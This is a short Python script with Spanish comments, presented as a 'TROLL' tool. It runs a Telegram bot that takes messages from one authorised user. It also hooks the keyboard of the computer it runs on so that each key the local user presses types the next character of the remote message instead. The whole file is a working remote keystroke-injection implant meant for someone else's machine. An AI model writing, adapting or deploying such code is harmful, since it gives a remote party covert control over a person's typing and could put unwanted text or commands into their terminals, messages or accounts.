import telebot
from pynput import keyboard
import threading

# Token del bot de Telegram, tienes que crarlo tu
TOKEN = 'TOKEN_BOT_TELEGRAM'
AUTHORIZED_USER_ID = ID_PERSONAL_REMPLAZAR  # Reemplaza con el ID de tu telegram

# Inicializar el bot de Telegram
bot = telebot.TeleBot(TOKEN)

# Almacenar el mensaje recibido y la posición actual
received_message = ""
current_position = 0  # Controla el avance a través del mensaje

# Controlador de teclado para simular pulsaciones de teclas
keyboard_controller = keyboard.Controller()

# Manejador para el comando /start
@bot.message_handler(commands=['start'])
def start(message):
    # Verificar si el usuario es el autorizado
    if message.from_user.id == AUTHORIZED_USER_ID:
        bot.send_message(message.chat.id, "TROLL activado, envia una palabra o frase.")
    else:
        bot.send_message(message.chat.id, "No estás autorizado para usar este bot.")

# Manejador para mensajes de texto
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    global received_message, current_position
    if message.from_user.id == AUTHORIZED_USER_ID:  # Verificar si el usuario es el autorizado
        received_message = message.text  # Guardar el mensaje recibido
        current_position = 0  # Reiniciar la posición al principio del mensaje
        bot.send_message(message.chat.id, f"TROLL Mensaje: {received_message}")
    else:
        bot.send_message(message.chat.id, "No estás autorizado para usar este bot.")

# Función para escribir el siguiente carácter del mensaje
def type_next_character():
    global current_position
    if current_position < len(received_message):
        char_to_type = received_message[current_position]  # Obtener el siguiente carácter
        keyboard_controller.type(char_to_type)  # Simular escritura
        current_position += 1  # Avanzar al siguiente carácter

# Manejador para pulsaciones de teclas
def on_press(key):
    type_next_character()  # Cada pulsación escribe el siguiente carácter del mensaje

# Iniciar el bot de Telegram en un hilo separado
def start_bot():
    bot.polling()

threading.Thread(target=start_bot).start()

# Escuchar las pulsaciones del teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()